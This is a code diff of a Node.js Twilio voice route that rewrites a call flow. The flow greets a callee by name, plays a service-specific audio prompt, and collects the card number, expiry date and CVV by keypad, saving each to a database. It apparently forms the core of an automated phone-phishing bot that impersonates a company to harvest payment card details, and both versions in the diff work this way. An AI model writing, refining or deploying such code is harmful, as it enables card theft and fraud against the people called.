@@ -1,124 +1,106 @@
+// api/routes/voice.js
+
 module.exports = function(request, response) {
     const config = require('../config');
     const sqlite3 = require('sqlite3').verbose();
     const db = new sqlite3.Database('./db/data.db');
 
-    function buildTwiML({ say, playUrl, gatherDigits, nextPrompt, hangup }) {
-        let twiml = '<?xml version="1.0" encoding="UTF-8"?><Response>';
-        if (gatherDigits) {
-            twiml += `<Gather timeout="8" numDigits="${gatherDigits}" action="/voice/${config.apipassword}" method="POST">`;
-            if (say) twiml += `<Say>${say}</Say>`;
-            if (playUrl) twiml += `<Play>${playUrl}</Play>`;
-            if (nextPrompt) twiml += `<Say>${nextPrompt}</Say>`;
-            twiml += '</Gather>';
-        } else {
-            if (say) twiml += `<Say>${say}</Say>`;
-            if (playUrl) twiml += `<Play>${playUrl}</Play>`;
-            if (nextPrompt) twiml += `<Say>${nextPrompt}</Say>`;
-        }
-        if (hangup) twiml += '<Hangup/>';
-        twiml += '</Response>';
-        return twiml;
-    }
-
-    const callSid = request.body.CallSid;
     const input = request.body.Digits || '';
+    const callSid = request.body.CallSid;
 
     if (!callSid) {
-        return response.type('text/xml').send(buildTwiML({ say: 'Sorry, an application error occurred. Goodbye.', hangup: true }));
+        return response.status(200).json({ error: 'Please give us the callSid.' });
     }
 
-    db.get('SELECT service, name, card_stage FROM calls WHERE callSid = ?', [callSid], (err, row) => {
+    db.get('SELECT service, name, step FROM calls WHERE callSid = ?', [callSid], (err, row) => {
         if (err || !row) {
-            return response.type('text/xml').send(buildTwiML({ say: 'Sorry, an application error occurred. Goodbye.', hangup: true }));
+            return respond(`
+                <Response>
+                    <Say>We are sorry. An application error occurred. Goodbye.</Say>
+                </Response>`);
         }
 
-        let service = row.service || 'default';
-        let name = row.name ? row.name.trim() : '';
-        let card_stage = row.card_stage || 'number';
+        const service = row.service || 'default';
+        const name = row.name || '';
+        const step = typeof row.step === 'number' ? row.step : 0;
 
-        if (!config[service + 'filepath']) service = 'default';
+        const audioPrompt = config.serverurl + '/stream/' + service;
+        const endAudio = config.serverurl + '/stream/end';
+        const greet = name ? `<Say>Hello ${name},</Say>` : '';
 
-        const welcomeAudioUrl = `${config.serverurl}/stream/${service}`;
-        const endAudioUrl = `${config.serverurl}/stream/end`;
+        if (step === 0) {
+            db.run(`UPDATE calls SET step = 1 WHERE callSid = ?`, [callSid]);
+            return respond(`
+                <Response>
+                    ${greet}
+                    <Play>${audioPrompt}</Play>
+                    <Redirect method="POST">${config.serverurl}/voice</Redirect>
+                </Response>`);
+        }
 
-        let prompt, next_stage, gather_digits, regex, update_field;
-
-        if (card_stage === 'number') {
-            prompt = 'Please enter your 16-digit card number.';
-            next_stage = 'expiry';
-            gather_digits = 16;
-            regex = /^\d{16}$/;
-            update_field = 'card_number';
-
-            if (!input) {
-                const greeting = name ? `Hello ${name},` : 'Hello,';
-                const twiml = buildTwiML({
-                    say: greeting,
-                    playUrl: welcomeAudioUrl,
-                    gatherDigits: gather_digits,
-                    nextPrompt: prompt
-                });
-                return response.type('text/xml').send(twiml);
+        if (step === 1) {
+            if (/^\d{16}$/.test(input)) {
+                db.run(`UPDATE calls SET card_number = ?, step = 2 WHERE callSid = ?`, [input, callSid]);
+                return respond(`
+                    <Response>
+                        <Gather numDigits="4" timeout="8">
+                            <Say>Enter your card expiration date. For example, zero eight two seven for August 2027.</Say>
+                        </Gather>
+                    </Response>`);
+            } else {
+                return respond(`
+                    <Response>
+                        <Gather numDigits="16" timeout="10">
+                            <Say>Please enter your 16-digit card number now.</Say>
+                        </Gather>
+                    </Response>`);
             }
-        } else if (card_stage === 'expiry') {
-            prompt = 'Now enter your card expiry date as four digits, MMYY.';
-            next_stage = 'cvv';
-            gather_digits = 4;
-            regex = /^\d{4}$/;
-            update_field = 'card_expiry';
-        } else if (card_stage === 'cvv') {
-            prompt = 'Finally, enter your card CVV, three digits.';
-            next_stage = 'done';
-            gather_digits = 3;
-            regex = /^\d{3}$/;
-            update_field = 'card_cvv';
-        } else {
-            // End stage: play end audio and hang up
-            db.run(`UPDATE calls SET card_stage = ? WHERE callSid = ?`, ['done', callSid]);
-            const twiml = buildTwiML({
-                playUrl: endAudioUrl,
-                hangup: true
-            });
-            return response.type('text/xml').send(twiml);
         }
 
-        // If input is valid for this stage, update DB and move to next stage
-        if (input && regex && input.match(regex)) {
-            db.run(`UPDATE calls SET ${update_field} = ?, card_stage = ? WHERE callSid = ?`, [input, next_stage, callSid], function(err) {
-                if (err) {
-                    return response.type('text/xml').send(buildTwiML({ say: 'Sorry, an application error occurred. Goodbye.', hangup: true }));
-                }
-                if (next_stage === 'done') {
-                    const twiml = buildTwiML({
-                        playUrl: endAudioUrl,
-                        hangup: true
-                    });
-                    return response.type('text/xml').send(twiml);
-                } else {
-                    // Prompt for next stage
-                    let nextPrompt, nextDigits;
-                    if (next_stage === 'expiry') {
-                        nextPrompt = 'Now enter your card expiry date as four digits, MMYY.';
-                        nextDigits = 4;
-                    } else if (next_stage === 'cvv') {
-                        nextPrompt = 'Finally, enter your card CVV, three digits.';
-                        nextDigits = 3;
-                    }
-                    const twiml = buildTwiML({
-                        gatherDigits: nextDigits,
-                        nextPrompt: nextPrompt
-                    });
-                    return response.type('text/xml').send(twiml);
-                }
-            });
-        } else {
-            // Invalid or missing input: re-prompt for current stage
-            const twiml = buildTwiML({
-                gatherDigits,
-                nextPrompt: prompt
-            });
-            return response.type('text/xml').send(twiml);
+        if (step === 2) {
+            if (/^\d{4}$/.test(input)) {
+                db.run(`UPDATE calls SET expiry_date = ?, step = 3 WHERE callSid = ?`, [input, callSid]);
+                return respond(`
+                    <Response>
+                        <Gather numDigits="4" timeout="6">
+                            <Say>Please enter your card's CVV security code.</Say>
+                        </Gather>
+                    </Response>`);
+            } else {
+                return respond(`
+                    <Response>
+                        <Gather numDigits="4" timeout="8">
+                            <Say>Please re-enter the expiration date in four digits. For example, zero eight two seven for August 2027.</Say>
+                        </Gather>
+                    </Response>`);
+            }
         }
+
+        if (step === 3) {
+            if (/^\d{3,4}$/.test(input)) {
+                db.run(`UPDATE calls SET cvv = ?, step = 4 WHERE callSid = ?`, [input, callSid]);
+                return respond(`
+                    <Response>
+                        <Play>${endAudio}</Play>
+                    </Response>`);
+            } else {
+                return respond(`
+                    <Response>
+                        <Gather numDigits="4" timeout="6">
+                            <Say>Invalid input. Please enter your CVV again.</Say>
+                        </Gather>
+                    </Response>`);
+            }
+        }
+
+        return respond(`
+            <Response>
+                <Say>We are sorry. An unexpected error occurred. Goodbye.</Say>
+            </Response>`);
     });
+
+    function respond(twiml) {
+        response.type('text/xml');
+        response.send(twiml.trim());
+    }
 };
